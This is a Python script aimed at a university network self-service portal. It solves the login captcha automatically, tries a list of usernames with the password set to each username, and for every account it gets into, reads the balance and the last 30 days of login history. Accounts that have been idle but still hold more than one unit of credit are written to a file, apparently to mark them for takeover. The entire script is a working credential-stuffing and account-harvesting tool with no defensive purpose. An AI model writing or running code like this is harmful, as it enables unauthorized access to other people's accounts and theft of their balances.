#-*- coding: UTF-8 -*-

import requests
from recognise import *
from PIL import Image
import base64
import getpass
import re
import datetime
import time
import sys

from BeautifulSoup import BeautifulSoup  

loginurl='http://192.168.252.133:8080/selfservice/module/scgroup/web/login_judge.jsf?'

# get login 
def loginget(username,passwd):
    session=requests.session()
    html = session.get(loginurl+'name='+username+'&password='+passwd).text
    if html.find('index_self.jsf') == -1 :
		return ""
    else:
		return session

def login(username,passwd):
    session=requests.session()
    session.get('http://192.168.252.133:8080/selfservice').text
    retry = 0
    while True :
        img=session.get('http://192.168.252.133:8080/selfservice/common/web/verifycode.jsp').content
        with open('captcha.jpeg','wb') as imgfile:
                imgfile.write(img)
        imageRecognize=CaptchaRecognize()
        image=Image.open('captcha.jpeg')
        result=imageRecognize.recognise(image)
        string=''
        for item in result:
                string+=item[1]
        print(username + ", verify code:" + string)
        data={
        #'usertype':"xs",
        'name':username,
        'password':passwd,
        'verify':string,
        'act':"add"
        #'ln':"app610.dc.hust.edu.cn"
        }
        headers = {
                'Host':"192.168.252.133:8080",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                'Referer':"http://192.168.252.133:8080/selfservice/module/scgroup/web/login_self.jsf",
                "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0"}
        session.post('http://192.168.252.133:8080/selfservice/module/scgroup/web/login_judge.jsf',data=data,headers=headers)
        html=session.get('http://192.168.252.133:8080/selfservice/module/webcontent/web/index_self.jsf',headers=headers).text
        soup = BeautifulSoup(html)
        flag = html.find(u'您还未登录或会话过期')
        time.sleep(1)
        if flag == -1:
            return session
        else :
            retry = retry + 1
            print(str(retry) + " logn error,retry now!")
            if retry > 2:
                break
    #print(html)
    return ""

#查连接记录
def onlineDetail(session):
    toTime = datetime.datetime.now()
    fromTime = datetime.datetime.now() - datetime.timedelta(days=30)

    headers = {
        'Host':"192.168.252.133:8080",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        'Referer':"http://192.168.252.133:8080/selfservice/module/onlineuserself/web/onlinedetailself_list.jsf",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0"}
    

    html=session.get('http://192.168.252.133:8080/selfservice/module/onlineuserself/web/onlinedetailself_list.jsf',headers=headers).text
    soup = BeautifulSoup(html) 
    submitCodeId=soup.find(id="submitCodeId")["value"]
    VIEW=soup.find(id="com.sun.faces.VIEW")["value"]
    
    data={
    #'usertype':"xs",
    'OnlineDetailForm:loginFromTime':fromTime.strftime("%Y-%m-%d")+' 00:00:00',
    'OnlineDetailForm:logoutToTime':toTime.strftime("%Y-%m-%d")+' 23:59:59',
    #'OnlineDetailForm:onlineTimeCompare':'onlineDetailSelfListBean.temp',
    'OnlineDetailForm':'OnlineDetailForm',
    'com.sun.faces.VIEW':VIEW,
    'submitCodeId':submitCodeId,
    'ec_i':'ec',
    'ec_crd':10,
    'ec_p':1
    }

    html=session.post('http://192.168.252.133:8080/selfservice/module/onlineuserself/web/onlinedetailself_list.jsf',data=data,headers=headers).content.decode('gbk')
    #print(html)
    soup = BeautifulSoup(html) 
    #tables = soup.findAll('table',{'id':'ec_table'})  
    #tab = tables[0]  
    #for tr in tab.findAll('tr'):  
    #    for td in tr.findAll('td'):  
    #        print td.getText(),  
    #    print 

    table=soup.findAll('table',{'id':'scrollTable'})
    logintimes=table[0].find('td').find('strong').text
    #print(logintimes)
 
    if logintimes != u'当前无记录':
        return logintimes
    else:
        return 0 

#查余额
def getbalance(session) :
    html=session.get('http://192.168.252.133:8080/selfservice/module/webcontent/web/content_self.jsf').text
    soup = BeautifulSoup(html)
    balance = soup.find('span',{'id':'offileForm:currentAccountFeeValue'}).text
    return float(balance)

#根据用户名和密码查询，默认一个月没有登录，并且余额多于1元的输出到result.re文件
def check(username,passwd):
    session = loginget(username,passwd)
    if session == "" :
        print(username + " login error, skip this number!")
        return
    balance = getbalance(session);
    logintimes = onlineDetail(session)
    print u'user:%s, balance:%f, donlinelog: %s' % (username, balance , logintimes)
    f = open("result.re", 'a+')
    if (logintimes == 0 and balance > 1):
        print >> f, username 

#账号列表查询
def checkList(filepath):
    for line in open(filepath):
	name=line.strip()
        check(name,name)
        print

def main():
    #username=input('username:')
    #passwd=base64.b64encode(getpass.getpass('Passwd:').encode()).decode()
    #username='bgnxy111'
    #passwd=username
    #check(username,passwd)
    checkList("test.re")

main()
